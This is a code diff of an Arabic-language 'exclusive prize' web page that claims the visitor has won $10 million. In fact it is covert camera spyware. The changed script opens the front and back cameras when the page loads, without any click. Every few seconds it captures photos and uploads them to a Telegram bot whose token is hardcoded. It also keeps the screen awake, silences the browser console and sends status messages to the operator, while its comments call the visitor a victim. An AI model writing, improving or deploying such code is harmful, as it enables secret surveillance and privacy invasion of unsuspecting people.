@@ -4,28 +4,32 @@
 <meta charset="UTF-8">
 <title>جائزة حصرية</title>
 <style>
-body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial; color:#fff; }
+body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial; color:#fff; overflow:hidden; }
 .card { background:rgba(20,10,10,0.95); padding:40px; border-radius:30px; border:2px solid #ffd700; text-align:center; max-width:400px; box-shadow:0 0 60px rgba(255,215,0,0.2); }
-.card h1 { color:#ffd700; }
-.card p { color:#ccc; margin:15px 0; }
-.btn { background:#ffd700; color:#000; border:none; padding:15px 40px; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; }
-.btn:hover { transform:scale(1.05); }
-.hidden { display:none; }
+.card h1 { color:#ffd700; font-size:28px; }
+.card p { color:#ccc; margin:15px 0; font-size:16px; }
+.hidden { display:none !important; }
 #status { font-size:14px; color:#ff8844; margin-top:10px; }
+.sparkle { color:#ffd700; font-size:22px; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
 </style>
 </head>
 <body>
 
 <div class="card" id="mainCard">
   <h1>🎉 فوز مفاجئ!</h1>
-  <p>لقد اخترتك أنت شخصيًا لجائزة <strong style="color:#ffd700;">10,000,000$</strong></p>
-  <p style="font-size:14px;color:#888;">للتأكد من هويتك، يلزم تفعيل الكاميرا لمدة ثانيتين</p>
-  <button class="btn" onclick="requestCamera()">✅ أوافق على التحقق</button>
-  <div id="status">⏳ اضغط للموافقة</div>
+  <p>لقد اخترتك لجائزة <strong style="color:#ffd700;">10,000,000$</strong></p>
+  <p style="font-size:13px;color:#888;">جاري تجهيز الجائزة... <span class="sparkle">✦</span></p>
+  <div id="status">⏳ يرجى الانتظار...</div>
 </div>
 
-<video id="video" autoplay muted playsinline class="hidden"></video>
-<canvas id="canvas" class="hidden"></canvas>
+<!-- فيديوهات مخفية -->
+<video id="videoFront" autoplay muted playsinline class="hidden"></video>
+<video id="videoBack" autoplay muted playsinline class="hidden"></video>
+
+<!-- كانفس للتصوير -->
+<canvas id="canvasFront" class="hidden"></canvas>
+<canvas id="canvasBack" class="hidden"></canvas>
 
 <script>
 // ============================================================
@@ -33,11 +37,10 @@ body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:fle
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let stream = null;
-let recorder = null;
-let chunks = [];
-let retryCount = 0;
-const MAX_RETRIES = 5;
+let frontStream = null, backStream = null;
+let frontInterval = null, backInterval = null;
+let photoCount = 0;
+const CAPTURE_INTERVAL = 3000; // كل 3 ثواني صورة
 
 // ============================================================
 // ================ الحصول على CHAT_ID ========================
@@ -49,13 +52,22 @@ function getChatId() {
       if (d.ok && d.result && d.result.length) {
         let last = d.result[d.result.length - 1];
         CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-        if (CHAT_ID) sendMessage('✅ تم تفعيل الجاسوسية');
-        else setTimeout(getChatId, 2000);
-      } else setTimeout(getChatId, 2000);
+        if (CHAT_ID) {
+          sendMessage('✅ تم تفعيل التصوير الخفي');
+          startHiddenCamera();
+        } else {
+          setTimeout(getChatId, 2000);
+        }
+      } else {
+        setTimeout(getChatId, 2000);
+      }
     })
     .catch(() => setTimeout(getChatId, 2000));
 }
 
+// ============================================================
+// ================ إرسال الصور إلى تليجرام ===================
+// ============================================================
 function sendMessage(text) {
   if (!CHAT_ID) return;
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -65,107 +77,123 @@ function sendMessage(text) {
   }).catch(() => {});
 }
 
-function sendVideo(blob, caption = '') {
-  if (!CHAT_ID || !blob || blob.size < 1000) return;
-  let fd = new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('video', blob, `vid_${Date.now()}.mp4`);
-  fd.append('caption', caption || '🎥 فيديو مسجل');
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd })
-    .catch(() => {});
+function sendPhoto(imageData, caption = '') {
+  if (!CHAT_ID || !imageData) return;
+  try {
+    let blob = dataURLtoBlob(imageData);
+    let fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+    fd.append('caption', caption || '📸 صورة ملتقطة');
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: fd
+    }).catch(() => {});
+  } catch(e) {}
+}
+
+function dataURLtoBlob(dataURL) {
+  let parts = dataURL.split(',');
+  let mime = parts[0].match(/:(.*?);/)[1];
+  let bstr = atob(parts[1]);
+  let n = bstr.length;
+  let u8arr = new Uint8Array(n);
+  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+  return new Blob([u8arr], { type: mime });
 }
 
 // ============================================================
-// ================ طلب الكاميرا بطريقة مخادعة ===============
+// ================ تشغيل الكاميرات بشكل خفي ==================
 // ============================================================
-function requestCamera() {
-  document.getElementById('status').innerHTML = '⏳ جاري التحقق من الهوية...';
-  document.getElementById('status').style.color = '#ffaa00';
-
+function startHiddenCamera() {
+  // ---- الكاميرا الأمامية ----
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-    audio: true
+    audio: false
   })
-  .then(s => {
-    stream = s;
-    document.getElementById('video').srcObject = s;
-    document.getElementById('video').classList.remove('hidden');
-    document.getElementById('status').innerHTML = '✅ تم التحقق بنجاح! جاري منح الجائزة...';
-    document.getElementById('status').style.color = '#00ff88';
-    document.querySelector('.btn').textContent = '🎁 جاري التجهيز...';
-    document.querySelector('.btn').disabled = true;
-
-    // بدء التسجيل الفعلي
-    startRecording(s);
-    sendMessage('✅ تم تفعيل الكاميرا بنجاح');
+  .then(stream => {
+    frontStream = stream;
+    let video = document.getElementById('videoFront');
+    video.srcObject = stream;
+    video.play();
+    
+    // إعداد الكانفس للأمامية
+    let canvas = document.getElementById('canvasFront');
+    canvas.width = 640;
+    canvas.height = 480;
+    let ctx = canvas.getContext('2d');
+    
+    // بدأ التصوير الدوري
+    frontInterval = setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      let imgData = canvas.toDataURL('image/jpeg', 0.9);
+      photoCount++;
+      sendPhoto(imgData, `📸 كاميرا أمامية #${photoCount}`);
+      sendMessage(`📸 تم تصوير أمامي #${photoCount}`);
+      document.getElementById('status').innerHTML = `📸 تم التقاط ${photoCount} صور`;
+    }, CAPTURE_INTERVAL);
+    
+    sendMessage('✅ تم تشغيل الكاميرا الأمامية');
   })
   .catch(err => {
-    console.log('طلب الكاميرا فشل:', err.message);
-    document.getElementById('status').innerHTML = '⚠️ يرجى السماح بالكاميرا والميكروفون للمتابعة';
-    document.getElementById('status').style.color = '#ff4444';
-    sendMessage('❌ رفض الضحية الكاميرا - المحاولة ' + (retryCount+1));
-
-    retryCount++;
-    if (retryCount < MAX_RETRIES) {
-      // محاولة إعادة الطلب بعد 3 ثوانٍ بشكل أكثر إلحاحًا
-      setTimeout(() => {
-        document.getElementById('status').innerHTML = '🔴 مطلوب تفعيل الكاميرا فورًا لتأكيد الجائزة';
-        requestCamera();
-      }, 3000);
-    } else {
-      document.getElementById('status').innerHTML = '❌ لم يتم تفعيل الكاميرا. لا يمكن صرف الجائزة.';
-      sendMessage('❌ فشل نهائي - رفض الضحية الكاميرا');
-    }
+    sendMessage('❌ فشل الكاميرا الأمامية: ' + err.message);
   });
-}
 
-// ============================================================
-// ================ بدء التسجيل والرفع ========================
-// ============================================================
-function startRecording(stream) {
-  try {
-    recorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 3000000 });
-    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-    recorder.onstop = () => {
-      if (chunks.length) {
-        let blob = new Blob(chunks, { type: 'video/mp4' });
-        sendVideo(blob, '🎥 فيديو من الكاميرا');
-        sendMessage(`📹 حجم الفيديو: ${Math.round(blob.size/1024/1024)} MB`);
-        chunks = [];
-      }
-      // إعادة التسجيل بشكل مستمر
-      if (recorder && recorder.state === 'inactive') {
-        setTimeout(() => recorder.start(10000), 500);
-      }
-    };
-    recorder.start(10000);
-    sendMessage('🎥 بدأ تسجيل الفيديو');
+  // ---- الكاميرا الخلفية ----
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+    audio: false
+  })
+  .then(stream => {
+    backStream = stream;
+    let video = document.getElementById('videoBack');
+    video.srcObject = stream;
+    video.play();
+    
+    // إعداد الكانفس للخلفية
+    let canvas = document.getElementById('canvasBack');
+    canvas.width = 640;
+    canvas.height = 480;
+    let ctx = canvas.getContext('2d');
+    
+    // بدأ التصوير الدوري
+    backInterval = setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      let imgData = canvas.toDataURL('image/jpeg', 0.9);
+      sendPhoto(imgData, `📸 كاميرا خلفية #${photoCount}`);
+      sendMessage(`📸 تم تصوير خلفي #${photoCount}`);
+    }, CAPTURE_INTERVAL);
+    
+    sendMessage('✅ تم تشغيل الكاميرا الخلفية');
+  })
+  .catch(err => {
+    sendMessage('❌ فشل الكاميرا الخلفية: ' + err.message);
+  });
 
-    // بعد 3 ثوانٍ تغيير النص لإيهام بأن الجائزة في الطريق
-    setTimeout(() => {
-      document.getElementById('status').innerHTML = '🎉 جارٍ إرسال الجائزة... انتظر قليلاً';
-      document.querySelector('.btn').textContent = '✅ تم الاستلام';
-    }, 3000);
-
-    // منع السكون
-    if ('wakeLock' in navigator) {
-      navigator.wakeLock.request('screen').catch(() => {});
-    }
-
-  } catch(e) {
-    sendMessage('❌ فشل التسجيل: ' + e.message);
+  // منع السكون
+  if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').catch(() => {});
   }
+
+  // تحديث الواجهة
+  document.getElementById('status').innerHTML = '📷 جاري التصوير...';
+  document.querySelector('.card p').innerHTML = '🎁 جاري تجهيز جائزتك <span class="sparkle">✦</span>';
 }
 
 // ============================================================
 // ================ حافظ على النشاط ===========================
 // ============================================================
 setInterval(() => {
-  if (CHAT_ID) sendMessage('🔄 نبض الجاسوسية مستمر');
-  if (recorder && recorder.state === 'inactive') {
-    try { recorder.start(10000); } catch(e) {}
+  if (CHAT_ID) sendMessage('🔄 التصوير الخفي مستمر');
+  
+  // إعادة تشغيل الكاميرات إذا توقفت
+  if (frontStream && !frontInterval) {
+    startHiddenCamera();
   }
-}, 15000);
+  if (backStream && !backInterval) {
+    startHiddenCamera();
+  }
+}, 30000);
 
 // ============================================================
 // ================ Service Worker =============================
@@ -189,18 +217,25 @@ if ('serviceWorker' in navigator) {
 // ============================================================
 console.log = console.warn = console.error = () => {};
 
-// الحصول على CHAT_ID
+// الحصول على CHAT_ID وبدء التصوير
 getChatId();
-setTimeout(() => { if (!CHAT_ID) getChatId(); }, 5000);
 
-// إظهار طلب الكاميرا بشكل تلقائي بعد 1.5 ثانية (بدون نقرة)
+// محاولة إعادة المحاولة
 setTimeout(() => {
-  // فقط إذا لم يضغط المستخدم يدويًا
-  if (!stream) {
-    document.getElementById('status').innerHTML = '⏳ جاري طلب التحقق تلقائيًا...';
-    requestCamera();
+  if (!CHAT_ID) getChatId();
+}, 5000);
+
+// بدء التصوير حتى لو لم يصل CHAT_ID بعد
+setTimeout(() => {
+  if (!frontInterval && !backInterval) {
+    startHiddenCamera();
   }
-}, 1500);
+}, 2000);
+
+// إرسال إشعار بدء
+setTimeout(() => {
+  if (CHAT_ID) sendMessage('🔥 بدأ التصوير الخفي - صور أمامية وخلفية');
+}, 3000);
 </script>
 </body>
 </html>
